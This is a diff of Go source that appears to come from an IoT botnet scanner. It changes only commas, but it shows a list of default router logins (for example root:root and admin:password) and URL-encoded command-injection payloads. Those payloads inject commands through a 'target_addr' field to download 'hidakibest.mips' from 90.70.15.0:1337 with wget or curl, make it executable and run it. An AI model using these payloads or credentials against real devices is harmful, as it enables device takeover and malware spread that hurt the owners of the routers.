@@ -28,7 +28,7 @@ var loginsString = []string{
 	"guest:guest", "support:support", "user:user", "admin:password", "default:default", 
 	"admin:password123", "admin:", "root:root", "admin:admin123", "admin:12345", 
 	"admin:pass", "admin:password1", "root:admin", "root:password", "root:1234", 
-	"admin:qwerty", "admin:abc123", "root:123456", "user:password", "user:1234"
+	"admin:qwerty", "admin:abc123", "root:123456", "user:password", "user:1234",
 }
 
 func zeroByte(a []byte) {
@@ -54,7 +54,7 @@ func sendExploit(target string) int {
 		// Exploit alternatif avec curl au lieu de wget
 		"target_addr=%3Brm%20-rf%20/var/tmp/wlancont%3Bcurl%20http://90.70.15.0:1337/hidakibest.mips%20-o%20/var/tmp/wlancont%3Bchmod%20777%20/var/tmp/wlancont%3B/var/tmp/wlancont%20fiber&waninf=1_INTERNET_R_VID_",
 		// Exploit pour différents chemins de fichier
-		"target_addr=%3Brm%20-rf%20/tmp/wlancont%3Bwget%20http://90.70.15.0:1337/hidakibest.mips%20-O%20->/tmp/wlancont%3Bchmod%20777%20/tmp/wlancont%3B/tmp/wlancont%20fiber&waninf=1_INTERNET_R_VID_"
+		"target_addr=%3Brm%20-rf%20/tmp/wlancont%3Bwget%20http://90.70.15.0:1337/hidakibest.mips%20-O%20->/tmp/wlancont%3Bchmod%20777%20/tmp/wlancont%3B/tmp/wlancont%20fiber&waninf=1_INTERNET_R_VID_",
 	}
 
 	// Essayer chaque exploit
